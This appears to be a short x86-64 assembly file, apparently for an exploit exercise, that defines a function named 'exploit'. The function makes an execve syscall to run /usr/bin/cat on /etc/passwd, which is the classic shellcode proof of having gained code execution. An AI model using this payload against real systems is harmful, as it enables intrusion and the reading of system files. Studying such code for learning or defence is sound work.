.intel_syntax noprefix

# https://man7.org/linux/man-pages/man2/execve.2.html
# https://man7.org/linux/man-pages/man2/syscall.2.html

.global exploit
exploit:
    push rbp
    mov rbp, rsp
    sub rsp, 24

    lea rax, .BIN[rip]    
    mov [rsp], rax
    lea rax, .FILE[rip]
    mov [rsp+8], rax
    mov QWORD PTR[rsp+16], 0

    mov rax, 59
    lea rdi, .BIN[rip]
    mov rsi, rsp
    mov rdx, 0
    syscall



    leave
    ret

    .FILE:
        .string "/etc/passwd"
    
    .BIN:
        .string "/usr/bin/cat"